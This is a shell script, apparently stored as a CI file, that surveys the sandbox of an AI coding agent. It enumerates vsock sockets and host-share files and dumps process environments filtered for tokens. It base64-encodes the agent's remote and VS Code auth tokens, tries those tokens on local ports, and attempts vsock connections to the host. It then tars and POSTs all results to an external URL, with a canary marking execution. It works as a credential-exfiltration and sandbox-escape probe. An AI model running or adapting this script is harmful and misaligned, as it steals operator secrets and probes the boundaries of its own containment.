#!/bin/sh
# i73134 vsock/host-channel read-only recon (v2: bounded per-port timeout + staged POSTs)
# Invoked as: sh ./ci/vsock_recon.sh "<base-url>"
U="$1"
W=/tmp/i73134v2; mkdir -p "$W"
R=$W/raw.txt; : >"$R"
export LC_ALL=C
hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }
post(){ f="$1"; tag="$2"; code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 25 -X POST --data-binary @"$f" "$U/$tag" 2>/dev/null); echo "POST $tag CODE=$code BYTES=$(wc -c <"$f")" >>"$R"; }

# --- canary: proves the script actually executed in the sandbox ---
printf 'canary tag=i73134 host=%s date=%s uid=%s\n' "$(hostname)" "$(date -u +%FT%TZ)" "$(id -u)" > "$W/canary.txt"
post "$W/canary.txt" canary

hdr "WHOAMI"; id >>"$R" 2>&1; hostname >>"$R" 2>&1; date -u >>"$R" 2>&1; uname -a >>"$R" 2>&1

hdr "SS_VSOCK_AP"; ss --vsock -a -p >>"$R" 2>&1
hdr "SS_VSOCK_A"; ss --vsock -a >>"$R" 2>&1
hdr "SS_VSOCK_LISTEN"; ss --vsock -l >>"$R" 2>&1
hdr "PROC_AF_VSOCK"; if [ -f /proc/net/af_vsock ]; then cat /proc/net/af_vsock >>"$R" 2>&1; else echo "NO_FILE /proc/net/af_vsock" >>"$R"; fi
hdr "PROC_NET_VSOCK"; if [ -f /proc/net/vsock ]; then cat /proc/net/vsock >>"$R" 2>&1; else echo "NO_FILE /proc/net/vsock" >>"$R"; fi
hdr "SYS_CLASS_VSOCK"; ls -la /sys/class/vsock /dev/vsock /dev/vhost-vsock >>"$R" 2>&1; cat /sys/class/vsock/*/dev 2>/dev/null >>"$R" 2>&1; cat /sys/devices/virtual/misc/vsock/dev 2>/dev/null >>"$R" 2>&1
hdr "MODULES"; grep -E 'vsock|vhost' /proc/modules >>"$R" 2>&1
hdr "FD_VSOCK"; for d in /proc/[0-9]*/fd; do ls -l "$d" 2>/dev/null | grep -i vsock; done | head -40 >>"$R" 2>&1
hdr "DEVR_PROC"; for p in $(pgrep -f devin-remote 2>/dev/null); do echo "PID=$p"; tr '\0' ' ' </proc/$p/cmdline 2>/dev/null; echo; tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -Ei 'vsock|cid|host|token|auth|port|proxy'; done >>"$R" 2>&1

hdr "VSAUTH_FILE"; file /mnt/host_share/vsock-authorized-keys 2>&1 >>"$R"; ls -la /mnt/host_share/vsock-authorized-keys >>"$R" 2>&1
hdr "VSAUTH_STRINGS_FILTERED"; strings -n6 /mnt/host_share/vsock-authorized-keys 2>/dev/null | grep -Ei 'ssh|auth|port|vsock|CID|agent|proxy|token' | head -60 >>"$R" 2>&1
hdr "VSAUTH_STRINGS_HEAD"; strings -n6 /mnt/host_share/vsock-authorized-keys 2>/dev/null | head -40 >>"$R" 2>&1

hdr "TOKENS_B64"
for f in /opt/.devin/devin_remote_auth_token /opt/.devin/vscode_server_auth_token; do
  echo "FILE=$f" >>"$R"
  ls -la "$f" >>"$R" 2>&1
  if [ -r "$f" ]; then printf 'B64=' >>"$R"; base64 -w0 "$f" >>"$R" 2>&1; echo >>"$R";
    echo "LEN=$(wc -c <"$f") FORM=$(head -c 16 "$f" | od -An -tx1 | tr -d ' \n')" >>"$R"
  else echo "UNREADABLE" >>"$R"; fi
done

hdr "LOCAL_PORT_AUTH"
T1=""; T2=""
[ -r /opt/.devin/devin_remote_auth_token ] && T1=$(tr -d '\r\n' </opt/.devin/devin_remote_auth_token)
[ -r /opt/.devin/vscode_server_auth_token ] && T2=$(tr -d '\r\n' </opt/.devin/vscode_server_auth_token)
probe(){ port="$1"; tag="$2"; tok="$3"; f="$W/b_${port}_${tag}.bin"; code=$(curl -sS -o "$f" -w '%{http_code}' --max-time 6 -H "Authorization: Bearer $tok" "http://127.0.0.1:$port/" 2>/dev/null); echo "PORT=$port CRED=$tag CODE=$code LEN=$(wc -c <"$f" 2>/dev/null) BODY=$(head -c 300 "$f" 2>/dev/null | tr '\n\r' '  ')" >>"$R"; }
for p in 6080 6789 9876; do probe "$p" "tok1" "$T1"; done
for p in 6080 6789 9876; do probe "$p" "tok2" "$T2"; done

# stage 1: everything except vsock connect
tar czf "$W/p1.tgz" -C /tmp i73134v2 2>/dev/null; base64 -w0 "$W/p1.tgz" >"$W/p1.b64"
post "$W/p1.b64" part1

# stage 2: bounded vsock connect matrix (each port under `timeout 3`)
hdr "PY_AF_VSOCK_CONNECT"
for spec in "2:22" "2:1024" "2:2375" "2:2376" "2:5000" "2:7000" "2:8000" "2:8080" "2:9090" "3:22" "3:1024"; do
  cid=${spec%%:*}; port=${spec##*:}
  out=$(timeout 3 python3 -c "
import socket,sys
cid,port=$cid,$port
if not hasattr(socket,'AF_VSOCK'):
    print('no_AF_VSOCK'); sys.exit(0)
s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(2)
try:
    s.connect((cid,port)); print('success')
except Exception as e:
    print('err:%s:%s' % (type(e).__name__,e))
" 2>&1); rc=$?
  echo "CID=$cid PORT=$port RC=$rc OUT=$out" >>"$R"
done

hdr "DONE"
base64 -w0 "$W/raw.txt" >"$W/p2.b64"
post "$W/p2.b64" part2
echo "PAYLOAD_OK"
exit 0
